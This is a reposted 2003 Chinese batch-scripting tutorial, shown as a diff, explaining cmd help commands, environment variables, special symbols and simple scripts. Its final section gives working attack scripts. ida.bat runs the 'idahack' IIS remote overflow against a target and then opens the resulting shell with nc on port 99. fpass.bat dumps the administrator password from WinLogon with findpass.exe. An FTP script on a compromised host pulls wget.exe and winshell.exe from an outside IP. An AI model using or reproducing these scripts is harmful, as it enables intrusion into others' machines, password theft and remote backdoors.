@@ -1,0 +1,308 @@
+
+   
+  批处理BAT加强说明    热     ★★★ 【字体：小 大】 
+ 
+  
+   
+   
+ 批处理BAT加强说明 
+ 
+作者：不详 文章来源：来自 Internet 点击数：2532 更新时间：2003-12-3 
+ 
+ 
+批处理BAT加强说明
+
+
+
+
+希望大家想了解BAT批处理的好好看看有所加强，看到刚才发表的文章我也认为BAT的重要性。这点大家都知道所以转了一章好东东大家共同提高。也希望大家有好东东好思想大家来了解加强。 
+　　　　　　　　　　　　　　　　　批处理BAT技巧 
+
+文章结构 
+1. 所有内置命令的帮助信息 
+2. 环境变量的概念 
+3. 内置的特殊符号(实际使用中间注意避开) 
+4. 简单批处理文件概念 
+5. 附件1 tmp.txt 
+6. 附件2 sample.bat 
+
+###################################################################### 
+1. 所有内置命令的帮助信息 
+###################################################################### 
+ver 
+cmd /? 
+set /? 
+rem /? 
+if /? 
+echo /? 
+goto /? 
+for /? 
+shift /? 
+call /? 
+其他需要的常用命令 
+type /? 
+find /? 
+findstr /? 
+copy /? 
+______________________________________________________________________ 
+下面将所有上面的帮助输出到一个文件 
+echo ver >tmp.txt 
+ver >>tmp.txt 
+echo cmd /? >>tmp.txt 
+cmd /? >>tmp.txt 
+echo rem /? >>tmp.txt 
+rem /? >>tmp.txt 
+echo if /? >>tmp.txt 
+if /? >>tmp.txt 
+echo goto /? >>tmp.txt 
+goto /? >>tmp.txt 
+echo for /? >>tmp.txt 
+for /? >>tmp.txt 
+echo shift /? >>tmp.txt 
+shift /? >>tmp.txt 
+echo call /? >>tmp.txt 
+call /? >>tmp.txt 
+echo type /? >>tmp.txt 
+type /? >>tmp.txt 
+echo find /? >>tmp.txt 
+find /? >>tmp.txt 
+echo findstr /? >>tmp.txt 
+findstr /? >>tmp.txt 
+echo copy /? >>tmp.txt 
+copy /? >>tmp.txt 
+type tmp.txt 
+______________________________________________________ 
+
+###################################################################### 
+2. 环境变量的概念 
+###################################################################### 
+_____________________________________________________________________________ 
+C:\Program Files>set 
+ALLUSERSPROFILE=C:\document． and Settings\All Users 
+CommonProgramFiles=C:\Program Files\Common Files 
+COMPUTERNAME=FIRST 
+ComSpec=C:\WINNT\system32\cmd.exe 
+NUMBER_OF_PROCESSORS=1 
+OS=Windows_NT 
+Os2LibPath=C:\WINNT\system32\os2\dll; 
+Path=C:\WINNT\system32;C:\WINNT;C:\WINNT\system32\WBEM 
+PATHEXT=.COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH 
+PROCESSOR_ARCHITECTURE=x86 
+PROCESSOR_IDENTIFIER=x86 Family 6 Model 6 Stepping 5, GenuineIntel 
+PROCESSOR_LEVEL=6 
+PROCESSOR_REVISION=0605 
+ProgramFiles=C:\Program Files 
+PROMPT=$P$G 
+SystemDrive=C: 
+SystemRoot=C:\WINNT 
+TEMP=C:\WINNT\TEMP 
+TMP=C:\WINNT\TEMP 
+USERPROFILE=C:\document． and Settings\Default User 
+windir=C:\WINNT 
+_____________________________________________________________________________ 
+
+path: 表示可执行程序的搜索路径. 我的建议是你把你的程序copy 到 
+%windir%\system32\. 这个目录里面. 一般就可以自动搜索到. 
+语法: copy mychenxu.exe %windir%\system32\. 
+使用点(.) 便于一目了然 
+对环境变量的引用使用(英文模式,半角)双引号 
+%windir% 变量 
+%%windir%% 二次变量引用. 
+我们常用的还有 
+%temp% 临时文件目录 
+%windir% 系统目录 
+%errorlevel% 退出代码 
+
+输出文件到临时文件目录里面.这样便于当前目录整洁. 
+
+对有空格的参数. 你应该学会使用双引号("") 来表示比如对porgram file文件夹操作 
+C:\>dir p* 
+C:\ 的目录 
+2000-09-02 11:47 2,164 PDOS.DEF 
+1999-01-03 00:47 <DIR> Program Files 
+1 个文件 2,164 字节 
+1 个目录 1,505,997,824 可用字节 
+
+C:\>cd pro* 
+C:\Program Files> 
+
+C:\> 
+C:\>cd "Program Files" 
+C:\Program Files> 
+
+
+###################################################################### 
+3. 内置的特殊符号(实际使用中间注意避开) 
+###################################################################### 
+微软里面内置了下列字符不能够在创建的文件名中间使用 
+con nul aux \ / │ ││ && ^ > < * 
+
+You can use most characters as variable values, including white space. If you use the special characters <, >, │, &, or ^, you must precede them with the escape character (^) or quotation marks. If you use quotation marks, they are included as part of the value because everything following the equal sign is taken as the value. Consider the following examples: 
+(大意: 要么你使用^作为前导字符表示.或者就只有使用双引号""了) 
+To create the variable value new&name, type: 
+set varname=new^&name 
+
+To create the variable value "new&name", type: 
+set varname="new&name" 
+
+The ampersand (&), pipe (│), and parentheses ( ) are special characters that must be preceded by the escape character (^) or quotation marks when you pass them as arguments. 
+
+find "Pacific Rim" < trade.txt > nwtrade.txt 
+IF EXIST filename. (del filename.) ELSE echo filename. missing 
+
+> 创建一个文件 
+>> 追加到一个文件后面 
+@ 前缀字符.表示执行时本行在cmd里面不显示, 可以使用 echo off关闭显示 
+^ 对特殊符号( > < &)的前导字符. 第一个只是显示aaa 第二个输出文件bbb 
+echo 123456 ^> aaa 
+echo 1231231 > bbb 
+() 包含命令 
+(echo aa & echo bb) 
+, 和空格一样的缺省分隔符号. 
+; 注释,表示后面为注释 
+: 标号作用 
+│ 管道操作 
+& Usage：第一条命令 & 第二条命令 [& 第三条命令...] 
+用这种方法可以同时执行多条命令，而不管命令是否执行成功 
+dir c:\*.exe & dir d:\*.exe & dir e:\*.exe 
+&& Usage：第一条命令 && 第二条命令 [&& 第三条命令...] 
+当碰到执行出错的命令后将不执行后面的命令，如果一直没有出错则一直执行完所有命令； 
+││ Usage：第一条命令 ││ 第二条命令 [││ 第三条命令...] 
+当碰到执行正确的命令后将不执行后面的命令，如果没有出现正确的命令则一直执行完所有命令； 
+
+常用语法格式 
+IF [NOT] ERRORLEVEL number command para1 para2 
+IF [NOT] string1==string2 command para1 para2 
+IF [NOT] EXIST filename command para1 para2 
+
+IF EXIST filename command para1 para2 
+IF NOT EXIST filename command para1 para2 
+IF "%1"=="" goto END 
+IF "%1"=="net" goto NET 
+IF NOT "%2"=="net" goto OTHER 
+IF ERRORLEVEL 1 command para1 para2 
+IF NOT ERRORLEVEL 1 command para1 para2 
+FOR /L %%i IN (start,step,end) DO command [command-parameters] %%i 
+FOR /F "eol=; tokens=2,3* delims=, " %i in (myfile.txt) do echo %i %j %k 
+按照字母顺序 ijklmnopq依次取参数. 
+eol=c - 指一个行注释字符的结尾(就一个) 
+skip=n - 指在文件开始时忽略的行数。 
+delims=xxx - 指分隔符集。这个替换了空格和跳格键的默认分隔符集。 
+
+
+###################################################################### 
+4. 简单批处理文件概念 
+###################################################################### 
+
+echo This is test > a.txt 
+type a.txt 
+echo This is test 11111 >> a.txt 
+type a.txt 
+echo This is test 22222 > a.txt 
+type a.txt 
+第二个echo是追加 
+第三个echo将清空a.txt 重新创建 a.txt 
+
+netstat -n │ find "3389" 
+这个将要列出所有连接3389的用户的ip. 
+
+________________test.bat___________________________________________________ 
+@echo please care 
+echo plese care 1111 
+echo plese care 2222 
+echo plese care 3333 
+@echo please care 
+@echo plese care 1111 
+@echo plese care 2222 
+@echo plese care 3333 
+rem 不显示注释语句,本行显示 
+@rem 不显示注释语句,本行不显示 
+@if exist %windir%\system32\find.exe (echo Find find.exe !!!) else (echo ERROR: Not find find.exe) 
+@if exist %windir%\system32\fina.exe (echo Find fina.exe !!!) else (echo ERROR: Not find fina.exe) 
+___________________________________________________________________________ 
+
+下面我们以具体的一个idahack程序就是ida远程溢出为例子.应该是很简单的. 
+
+___________________ida.bat_________________________________________________ 
+@rem ver 1.0 
+@if NOT exist %windir%\system32\idahack.exe echo "ERROR: dont find idahack.exe" 
+@if NOT exist %windir%\system32\nc.exe echo "ERROR: dont find nc.exe" 
+
+@if "%1" =="" goto USAGE 
+@if NOT "%2" =="" goto SP2 
+
+:start 
+@echo Now start ... 
+@ping %1 
+@echo chinese win2k:1 sp1:2 sp2:3 
+idahack.exe %1 80 1 99 >%temp%\_tmp 
+@echo "prog exit code [%errorlevel%] idahack.exe" 
+@type %temp%\_tmp 
+@find "good luck" %temp%\_tmp 
+@echo "prog exit code [%errorlevel%] find [goog luck]" 
+@if NOT errorlevel 1 nc.exe %1 99 
+@goto END 
+
+:SP2 
+@idahack.exe %1 80 %2 99 %temp%\_tmp 
+@type %temp%\_tmp 
+@find "good luck" %temp%\_tmp 
+@if NOT errorlevel 1 nc.exe %1 99 
+@goto END 
+
+:USAGE 
+@echo Example: ida.bat IP 
+@echo Example: ida.bat IP (2,3) 
+
+:END 
+_____________________ida.bat__END_________________________________ 
+
+下面我们再来第二个文件.就是得到administrator的口令. 
+大多数人说得不到.其实是自己的没有输入正确的信息. 
+
+___________________________fpass.bat____________________________________________ 
+@rem ver 1.0 
+@if NOT exist %windir%\system32\findpass.exe echo "ERROR: dont find findpass.exe" 
+@if NOT exist %windir%\system32\pulist.exe echo "ERROR: dont find pulist.exe" 
+
+@echo start.... 
+@echo ____________________________________ 
+@if "%1"=="" goto USAGE 
+@findpass.exe %1 %2 %3 >> %temp%\_findpass.txt 
+@echo "prog exit code [%errorlevel%] findpass.exe" 
+@type %temp%\_findpass.txt 
+@echo ________________________________Here__pass★★★★★★★★ 
+@ipconfig /all >>%temp%\_findpass.txt 
+@goto END 
+
+:USAGE 
+@pulist.exe >%temp%\_pass.txt 
+@findstr.exe /i "WINLOGON explorer internat" %temp%\_pass.txt 
+@echo "Example: fpass.bat %1 %2 %3 %4 !!!" 
+@echo "Usage: findpass.exe DomainName UserName PID-of-WinLogon" 
+
+:END 
+@echo " fpass.bat %COMPUTERNAME% %USERNAME% administrator " 
+@echo " fpass.bat end [%errorlevel%] !" 
+_________________fpass.bat___END___________________________________________________________ 
+
+还有一个就是已经通过telnet登陆了一个远程主机.怎样上传文件(win) 
+依次在窗口输入下面的东西. 当然了也可以全部拷贝.Ctrl+V过去. 然后就等待吧!! 
+
+echo open 210.64.x.4 3396>w 
+echo read>>w 
+echo read>>w 
+echo cd winnt>>w 
+echo binary>>w 
+echo pwd >>w 
+echo get wget.exe >>w 
+echo get winshell.exe >>w 
+echo get any.exe >>w 
+echo quit >>w 
+ftp -s:w 
+ 
+ 
+ 
+ 
+ 
+ 
